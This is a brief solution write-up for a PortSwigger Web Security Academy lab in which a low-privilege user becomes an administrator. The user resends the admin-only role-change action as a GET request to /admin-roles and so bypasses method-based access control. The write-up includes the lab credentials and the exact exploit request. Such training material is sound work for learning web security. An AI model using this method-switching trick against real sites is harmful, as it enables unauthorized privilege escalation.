https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented


This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.

To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator.


1) access as administrator:admin and chenge the roles of carlos to understand how it works

2) we can see that the changing of a role is done using a post request to the endpoint /admin-roles with a body:
    username=carlos&action=upgrade

3) log out and log in as wiener:peter
    try to perform a GET request to /admin-roles as:
    GET https://0a93007203b689a181202aac007c00ec.web-security-academy.net/admin-roles?username=wiener&action=upgrade

    we can see that it works because wiener now is an admin


